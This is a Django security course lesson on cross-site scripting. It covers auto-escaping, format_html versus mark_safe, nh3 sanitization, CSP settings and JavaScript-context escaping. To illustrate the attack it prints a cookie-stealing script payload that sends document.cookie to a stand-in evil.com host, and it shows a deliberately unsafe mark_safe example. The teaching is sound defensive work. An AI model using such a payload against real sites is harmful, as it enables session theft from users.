---
source_course: "django-security"
source_lesson: "django-security-xss-protection"
---

# XSS Protection in Django

## Introduction

Cross-Site Scripting (XSS) is one of the most common web vulnerabilities. Attackers inject malicious JavaScript into pages viewed by other users, stealing cookies, session tokens, or performing actions on behalf of victims. Django's template engine auto-escapes output by default, providing strong baseline protection.

## Key Concepts

- **XSS (Cross-Site Scripting)**: Injecting malicious scripts into web pages served to other users.
- **Auto-Escaping**: Django templates automatically convert dangerous characters (<, >, &, quotes) into safe HTML entities.
- **Content Security Policy (CSP)**: HTTP header that restricts which scripts, styles, and resources a page can load.
- **nh3**: Recommended Rust-based HTML sanitizer for user-submitted rich text (bleach was deprecated in 2023).

## Real World Context

XSS has been exploited to hijack admin sessions on CMS platforms, inject cryptocurrency miners into high-traffic sites, and exfiltrate user data from web applications. A single unsanitized user input rendered with |safe or mark_safe() can compromise every visitor to that page.

## Deep Dive

### How XSS Works

```html
<!-- User submits this as their 'name' -->
<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>

<!-- If rendered without escaping -->
Hello, <script>document.location='...'</script>!
```

### Django's Auto-Escaping

Django templates automatically escape dangerous characters:

```python
# Context
{'username': '<script>alert("XSS")</script>'}
```

```html
<!-- Template -->
<p>Welcome, {{ username }}</p>

<!-- Rendered output (safe) -->
<p>Welcome, &lt;script&gt;alert("XSS")&lt;/script&gt;</p>
```

### Characters Escaped

| Character | Escaped As |
|-----------|------------|
| < | &lt; |
| > | &gt; |
| ' | &#x27; |
| " | &quot; |
| & | &amp; |

### Marking Content as Safe

```python
# views.py
from django.utils.safestring import mark_safe
from django.utils.html import format_html

def get_status_badge(status):
    # DANGEROUS - Don't do this with user input!
    return mark_safe(f'<span class="badge badge-{status}">{status}</span>')

def get_status_badge_safe(status):
    # SAFE - Use format_html for interpolation
    return format_html(
        '<span class="badge badge-{}">{}</span>',
        status,
        status
    )
```

```html
<!-- Template - disable escaping (DANGEROUS) -->
{{ html_content|safe }}

<!-- Only use |safe when you control the content -->
{% autoescape off %}
    {{ trusted_html }}
{% endautoescape %}
```

### Safe HTML Rendering

```python
# For user-submitted HTML, use a sanitizer
# pip install nh3  (nh3 is the recommended HTML sanitizer; bleach was deprecated in 2023)

import nh3

ALLOWED_TAGS = {
    'p', 'br', 'strong', 'em', 'ul', 'ol', 'li', 'a',
    'h1', 'h2', 'h3', 'blockquote', 'code', 'pre'
}

ALLOWED_ATTRIBUTES = {
    'a': {'href', 'title'},
}

def sanitize_html(html):
    return nh3.clean(
        html,
        tags=ALLOWED_TAGS,
        attributes=ALLOWED_ATTRIBUTES,
    )

# In model
class Article(models.Model):
    body_raw = models.TextField()  # User input
    body_html = models.TextField()  # Sanitized
    
    def save(self, *args, **kwargs):
        self.body_html = sanitize_html(self.body_raw)
        super().save(*args, **kwargs)
```

### Content Security Policy

```python
# Django 6.0+ native CSP (no third-party package needed)
from django.utils.csp import CSP

MIDDLEWARE = [
    # ...
    'django.middleware.csp.ContentSecurityPolicyMiddleware',
]

SECURE_CSP = {
    'default-src': [CSP.SELF],
    'script-src': [CSP.SELF, CSP.NONCE],
    'style-src': [CSP.SELF, CSP.UNSAFE_INLINE],
    'img-src': [CSP.SELF, 'data:', 'https:'],
    'font-src': [CSP.SELF, 'https://fonts.gstatic.com'],
}

# For Django < 6.0, use the third-party django-csp package:
# pip install django-csp
```

### JavaScript Escape Filter

```html
<!-- For JavaScript contexts, use escapejs -->
<script>
var username = "{{ username|escapejs }}";
var data = {{ json_data|safe }};  // Use json.dumps() in view
</script>
```

```python
# views.py
import json

def my_view(request):
    data = {'name': '<script>alert(1)</script>'}
    return render(request, 'template.html', {
        'json_data': json.dumps(data)  # Properly escaped JSON
    })
```

## Common Pitfalls

1. **Using |safe or mark_safe() with user input** — Completely bypasses auto-escaping, rendering any injected scripts executable.
2. **Forgetting JavaScript context escaping** — HTML escaping does not protect inside <script> tags; use |escapejs or json.dumps().
3. **Trusting sanitized HTML from the client** — Always sanitize server-side; client-side sanitization can be bypassed.

## Best Practices

1. **Never use |safe with untrusted data** — Use format_html() when you need to mix HTML with user values.
2. **Use CSP headers** — Defense-in-depth that blocks inline scripts even if escaping fails.
3. **Sanitize with nh3 for rich text** — Allowlist-based sanitization is the only safe approach for user HTML.

## Summary

- Django auto-escapes template output by default, neutralizing most XSS vectors.
- Use format_html() instead of mark_safe() when interpolating user data into HTML.
- Add Content Security Policy headers for defense-in-depth against script injection.

## Code Examples

**Safe patterns for rendering user content: format_html for templates and nh3 for rich text sanitization**

```python
from django.utils.html import format_html
import nh3

# SAFE: format_html escapes interpolated values
def user_badge(username):
    return format_html(
        '<span class="badge">{}</span>',
        username  # Auto-escaped
    )

# SAFE: Sanitize user HTML with nh3
def clean_user_html(raw_html):
    return nh3.clean(
        raw_html,
        tags={'p', 'br', 'strong', 'em', 'a'},
        attributes={'a': {'href'}},
    )
```


## Resources

- [XSS Prevention](https://docs.djangoproject.com/en/6.0/topics/security/#cross-site-scripting-xss-protection) — Django XSS protection guide

---

> 📘 *This lesson is part of the [Django Security Best Practices](https://stanza.dev/courses/django-security) course on [Stanza](https://stanza.dev) — the IDE-native learning platform for developers.*